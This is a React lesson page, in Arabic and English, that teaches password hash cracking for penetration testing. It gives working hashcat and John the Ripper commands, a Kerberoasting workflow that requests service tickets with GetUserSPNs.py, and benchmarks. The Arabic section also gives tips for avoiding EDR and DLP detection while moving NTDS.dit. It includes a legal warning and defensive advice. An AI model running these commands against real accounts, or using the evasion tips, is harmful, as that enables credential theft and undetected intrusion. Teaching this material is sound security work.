"use client";
import { LessonShell, Section, Callout, Code, Terminal, Step, Analogy, TwoCol, Card, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="password-cracking">
      <L
        ar={<>
          <Section title="ليه بنكسر hashes أصلاً؟">
            <Analogy>
              بُص.
              مكتبة قرّرت تحتفظ بقايمة الكتب اللي قراها كل عضو..
              بس بدل ما تكتب الاسم، حطّت بصمة (hash).

              - طب أنا هرجّع الاسم من البصمة إزاي يا حضرتك؟؟

              مارجعش يا مستجد. ولا حد بيرجّع.
              إنت بتاخد كل الأسامي اللي تعرفها، تحسب بصماتها، وتقارن.
              ده بالظبط كسر الباسوردات. مش عكس الـ hash — تخمين الـ password، حسبة، مقارنة.
            </Analogy>
            <p>
              في أي engagement، هتلاقي نفسك جايب hashes من LSASS أو NTDS.dit أو /etc/shadow أو dump قاعدة بيانات. تكسرهم يبقوا credentials للـ lateral movement.
            </p>
            <Callout kind="info" title="LinkedIn 2012">
              6.5 مليون hash سُرّبت. كانت كلها SHA-1 بدون salt. في 72 ساعة الـ community كسر 90% منها.
              ليه؟ unsalted SHA-1 بيتحسب على RTX حديث بـ ~50 GH/s.
              لو كانت bcrypt، نفس الكسر كان هياخد آلاف السنين.
              الفرق بين كارثة وانك متحصّن = اختيار خوارزمية صح. مش أكتر.
            </Callout>
          </Section>

          <Section title="أنواع الـ hashes الشائعة">
            <Code lang="text">{`NTLM           — Windows local/domain accounts (16 bytes MD4)
NetNTLMv2      — Network challenge-response (Responder loot)
Kerberos 5 TGS — kerberoasting target (mode 13100)
DCC2 (MSCash2) — cached domain creds on workstations
bcrypt         — modern web apps ($2a$, $2b$)
SHA-512crypt   — Linux /etc/shadow ($6$)
MD5 / SHA1     — لا تزال موجودة في تطبيقات قديمة
PBKDF2-SHA256  — modern, slow (iOS keychain, 1Password)`}</Code>
          </Section>

          <Section title="Hashcat — أداة الميدان">
            <Step n={1} title="جهّز الـ rig">
              GPU مش رفاهية، ضروري. RTX 4090 بيكسر 280 GH/s NTLM، أسرع من الـ CPU بعشرات المرات. حتى GTX 1080 بيمشّيك في الأول.
            </Step>
            <Step n={2} title="هجوم بقاموس">
              <Code lang="bash">{`# rockyou.txt = القاموس المفضّل (14M password)
hashcat -m 1000 -a 0 ntlm-hashes.txt /usr/share/wordlists/rockyou.txt

# -m 1000 = NTLM
# -a 0 = straight wordlist`}</Code>
            </Step>
            <Step n={3} title="هجوم بـ rules">
              القاعدة بتعدّل على كل كلمة (Capitalize، تضيف 2024، تستبدل e بـ 3).
              <Code lang="bash">{`hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# best64.rule = 64 تحويلة شائعة، بتزوّد فعالية القاموس 5x-10x`}</Code>
            </Step>
            <Step n={4} title="Mask attack — بنية معروفة">
              السياسة "8 حروف ورقم في الآخر"؟ استخدم mask.
              <Code lang="bash">{`# ?u=upper ?l=lower ?d=digit ?s=symbol
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?l?l?d
# Spring2024! style:
hashcat -m 1000 -a 3 hashes.txt -1 'Spring|Summer|Fall|Winter' ?1?d?d?d?d?s`}</Code>
            </Step>
            <Step n={5} title="Hybrid">
              كلمة من القاموس + 4 أرقام في الآخر (تجمع الاتنين).
              <Code lang="bash">{`hashcat -m 1000 -a 6 hashes.txt rockyou.txt ?d?d?d?d`}</Code>
            </Step>
          </Section>

          <Section title="Kerberoasting workflow">
            <p>
              النقطة الذهبية: حسابات الخدمة في AD غالباً باسوردها ضعيف وقابل للـ hashing. وأي domain user يقدر يطلب لها TGS.
            </p>
            <Code lang="bash">{`# جلب الـ tickets
GetUserSPNs.py -request corp.local/normaluser:Pass123 -dc-ip 10.0.0.10 -outputfile tgs.hashes

# كسرها (mode 13100)
hashcat -m 13100 -a 0 tgs.hashes rockyou.txt -r best64.rule

# Service accounts often have "Service@2023" / "ServiceName123" passwords`}</Code>
          </Section>

          <Section title="JtR — للحالات التي يفشل فيها hashcat">
            <p>
              John the Ripper تحفة في الأنواع الغريبة (KeePass، 1Password، PDF، ZIP). hashcat للـ GPU، John للـ CPU والمرونة.
            </p>
            <Code lang="bash">{`# تخمين تلقائي للـ hash type
john --wordlist=rockyou.txt hashes.txt

# على keepass
keepass2john Database.kdbx > kp.hash
john --wordlist=rockyou.txt kp.hash`}</Code>
          </Section>

          <Callout kind="danger" title="تحذير قانوني">
            تكسر hashes جايبها من نظام مش بتاعك أو من dump مسرّب = جريمة. كل اللي إحنا بنشتغل عليه هنا مفترض إنه hashes
            من معملك أو engagement عليه authorization.
          </Callout>

          <Callout kind="good" title="الحماية — اكتبها على إيدك">
            <ul>
              <li>الطول &gt; التعقيد: 16 حرف random أصعب من Pa$$w0rd1!</li>
              <li>افرض passphrase 4 كلمات (XKCD diceware).</li>
              <li>اقفل الكلمات الشائعة: HaveIBeenPwned API على الـ signup.</li>
              <li>استخدم bcrypt أو argon2id، مش MD5/SHA — slow by design.</li>
              <li>MFA في كل مكان — الـ hash اتكسر، بس مش هيعدّي.</li>
              <li>راقب Kerberoasting: 4769 TGS requests غير عادية.</li>
              <li>استخدم gMSA (Group Managed Service Accounts) — باسوردات 240 حرف بتدور لوحدها.</li>
            </ul>
          </Callout>

          <Section title="مقاييس">
            <Code lang="text">{`-- RTX 4090 على NTLM --
Pure brute  ?u?l?l?l?l?l?d?d  ≈ 6 ساعات
8-char rockyou + best64       ≈ دقيقتان
Kerberoast (13100) rockyou    ≈ 8 ساعات per ticket

-- DCC2 (slow) --
~4 MH/s فقط — تجنبه إلا للحسابات عالية القيمة`}</Code>
          </Section>

          <Section title="مصادر">
            <ul>
              <li>Hashcat wiki — <span className="eng">hashcat.net/wiki</span></li>
              <li>SecLists — wordlists collection</li>
              <li>Hash-Identifier / hashid — تحديد نوع الـ hash</li>
              <li>CrackStation — lookup tables للـ hashes الضعيفة</li>
            </ul>
          </Section>

          <Section title="غلطات الـ junior — اللي بتكشف العملية">
            <Callout kind="warn" title="لو فات عليك ده، يبقى مش بتراقب">
              <ul>
                <li>بيـ run الـ hashcat على الـ laptop المؤسسي. الـ EDR شايف "process بيستهلك GPU 100%" = alert فوري.</li>
                <li>بينقل الـ NTDS.dit بحجم 5 GB على network share. الـ DLP بيمسكه قبل ما يخلص.</li>
                <li>بيكسر الـ hashes كلها قبل ما يفلترها. 50 ألف user، الـ Domain Admin من ضمنهم بس هو اللي يهم.</li>
                <li>بيستخدم rockyou.txt على hashes جايّة من بيئة غير-إنجليزية. الـ user بيستخدم باسوردات عربي/تركي/فرنسي. ما هتلاقي حاجة.</li>
              </ul>
              <p>الخلاصة: الـ cracking مش "اضغط زرار". هو فلترة + فهم للسياق + GPU. والأهم: لازم يكون على جهاز معزول، مش على endpoint مراقَب.</p>
            </Callout>
          </Section>

          <Section title="الخلاصة الناشفة">
            <p>الـ password ما اتكسرش — أنت اللي اخترته ضعيف.</p>
            <p>اوعى تقول "إحنا عندنا policy تعقيد". الـ policy على ورق وبس.</p>
            <p>الـ org اللي بتفرض 16-char passphrase + bcrypt/argon2 + MFA = الـ hashes بتاعتها بلا قيمة.</p>
            <p>الـ org اللي عندها "Spring2024!" كباسورد لـ service account = اخترقت بالفعل، بس لسه ما عرفتش.</p>
            <p>أنت ونصيبك في الآخر — يا الـ Kerberoast بيتمسك في 4 ثواني، يا قاعد جواك سنين.</p>
          </Section>
        </>}

        en={<>
          <Section title="Why crack hashes at all?">
            <Analogy>
              A library replaces every member's name with a fingerprint (hash) on its borrowing list. You can't reverse
              a fingerprint to a name, but you can take every known name, fingerprint each, and compare. That is
              password cracking: not reversing the hash, but guessing the password, hashing it, and matching.
            </Analogy>
            <p>
              In every engagement you'll harvest hashes from LSASS, NTDS.dit, /etc/shadow, or a database dump. Cracking
              them turns hashes into reusable credentials for lateral movement.
            </p>
          </Section>

          <Section title="Common hash types">
            <Code lang="text">{`NTLM           — Windows local/domain accounts (16 bytes MD4)
NetNTLMv2      — Network challenge-response (Responder loot)
Kerberos 5 TGS — kerberoasting target (mode 13100)
DCC2 (MSCash2) — cached domain creds on workstations
bcrypt         — modern web apps ($2a$, $2b$)
SHA-512crypt   — Linux /etc/shadow ($6$)
MD5 / SHA1     — still around in legacy apps
PBKDF2-SHA256  — modern, slow (iOS keychain, 1Password)`}</Code>
          </Section>

          <Section title="Hashcat — the field tool">
            <Step n={1} title="Build a rig">
              GPU is required. An RTX 4090 cracks 280 GH/s of NTLM — orders of magnitude over CPU. Even a GTX 1080
              works to start.
            </Step>
            <Step n={2} title="Dictionary attack">
              <Code lang="bash">{`# rockyou.txt = the default wordlist (14M passwords)
hashcat -m 1000 -a 0 ntlm-hashes.txt /usr/share/wordlists/rockyou.txt

# -m 1000 = NTLM
# -a 0 = straight wordlist`}</Code>
            </Step>
            <Step n={3} title="Rule-based attack">
              Rules mutate each candidate (capitalize, append 2024, replace e with 3).
              <Code lang="bash">{`hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# best64.rule = 64 common transforms, multiplies wordlist effectiveness 5x-10x`}</Code>
            </Step>
            <Step n={4} title="Mask attack — known structure">
              If policy is "8 chars, digit at end," use a mask.
              <Code lang="bash">{`# ?u=upper ?l=lower ?d=digit ?s=symbol
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?l?l?d
# Spring2024! style:
hashcat -m 1000 -a 3 hashes.txt -1 'Spring|Summer|Fall|Winter' ?1?d?d?d?d?s`}</Code>
            </Step>
            <Step n={5} title="Hybrid">
              Wordlist entry + 4 trailing digits.
              <Code lang="bash">{`hashcat -m 1000 -a 6 hashes.txt rockyou.txt ?d?d?d?d`}</Code>
            </Step>
          </Section>

          <Section title="Kerberoasting workflow">
            <p>
              The jewel: AD service accounts often have weak, hash-able passwords. Any domain user can request a TGS
              for them.
            </p>
            <Code lang="bash">{`# Request the tickets
GetUserSPNs.py -request corp.local/normaluser:Pass123 -dc-ip 10.0.0.10 -outputfile tgs.hashes

# Crack (mode 13100)
hashcat -m 13100 -a 0 tgs.hashes rockyou.txt -r best64.rule

# Service accounts often have "Service@2023" / "ServiceName123" passwords`}</Code>
          </Section>

          <Section title="JtR — when hashcat doesn't fit">
            <p>
              John the Ripper handles weird formats (KeePass, 1Password, PDF, ZIP). Hashcat for GPU, John for CPU and
              flexibility.
            </p>
            <Code lang="bash">{`# Auto-detect hash type
john --wordlist=rockyou.txt hashes.txt

# KeePass
keepass2john Database.kdbx > kp.hash
john --wordlist=rockyou.txt kp.hash`}</Code>
          </Section>

          <Callout kind="danger" titleEn="Legal warning">
            Cracking hashes harvested from a system you don't own or a leaked breach corpus is a crime. Every workflow
            here assumes hashes from your lab or an authorized engagement.
          </Callout>

          <Callout kind="good" titleEn="Defense — why password policy matters">
            <ul>
              <li>Length &gt; complexity: a 16-char random string beats Pa$$w0rd1!</li>
              <li>Enforce 4-word passphrases (XKCD diceware)</li>
              <li>Block common passwords: HaveIBeenPwned API at signup</li>
              <li>Use bcrypt or argon2id, not MD5/SHA — slow by design</li>
              <li>MFA everywhere — a cracked hash still hits a wall</li>
              <li>Watch for Kerberoasting: anomalous 4769 TGS requests</li>
              <li>Use Group Managed Service Accounts (gMSA) — 240-char passwords, auto-rotated</li>
            </ul>
          </Callout>

          <Section title="Benchmarks">
            <Code lang="text">{`-- RTX 4090 on NTLM --
Pure brute  ?u?l?l?l?l?l?d?d  ≈ 6 hours
8-char rockyou + best64       ≈ 2 minutes
Kerberoast (13100) rockyou    ≈ 8 hours per ticket

-- DCC2 (slow) --
~4 MH/s only — avoid except for high-value accounts`}</Code>
          </Section>

          <Section title="References">
            <ul>
              <li>Hashcat wiki — <span className="eng">hashcat.net/wiki</span></li>
              <li>SecLists — wordlists collection</li>
              <li>Hash-Identifier / hashid — fingerprint hash type</li>
              <li>CrackStation — lookup tables for weak hashes</li>
            </ul>
          </Section>
        </>}
      />
    </LessonShell>
  );
}
